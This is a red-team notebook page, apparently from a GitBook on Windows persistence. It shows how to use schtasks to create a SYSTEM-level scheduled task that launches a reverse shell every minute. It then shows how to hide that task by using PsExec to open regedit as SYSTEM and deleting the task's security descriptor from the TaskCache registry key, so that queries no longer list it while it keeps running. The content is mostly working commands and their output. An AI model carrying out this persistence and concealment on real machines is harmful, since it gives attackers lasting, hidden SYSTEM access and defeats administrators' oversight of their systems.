---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/persistence/scheduled-tasks-elevated
---

# Scheduled Tasks (Elevated )

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often:

```c
C:\>schtasks /create /sc minute /mo 1 /tn Persistence /tr "C:\Windows\Tasks\shell.exe" /ru SYSTEM
SUCCESS: The scheduled task "Persistence" has successfully been created.
```

Where: <mark style="color:red;">**schtasks /create /?**</mark> - for usage

* <mark style="color:red;">**/SC**</mark> - schedule Specifies the schedule frequency. Valid schedule types: MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.
* <mark style="color:red;">**/mo 1**</mark> - every single minute
* <mark style="color:red;">**/RU**</mark> - username

Verify service created:

```c
C:\>schtasks /query /tn Persistence

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
Persistence                              4/3/2024 9:41:00 PM    Ready
```

We will got shell after 1 minute

<figure><img src="../../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>

To hide our task, let's delete the SD value for the "Persistence" task we created before. The security descriptors of all scheduled tasks are stored in&#x20;

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
```

<figure><img src="../../../.gitbook/assets/image (904).png" alt=""><figcaption></figcaption></figure>

We will use psexec to open Regedit with SYSTEM privileges to delete SD value

```
C:\> PsExec64.exe -i -s regedit
```

<figure><img src="../../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

```
C:\>schtasks /query /tn Persistence
ERROR: The system cannot find the file specified.
```

However, the tasks still execute as the same.

<figure><img src="../../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>
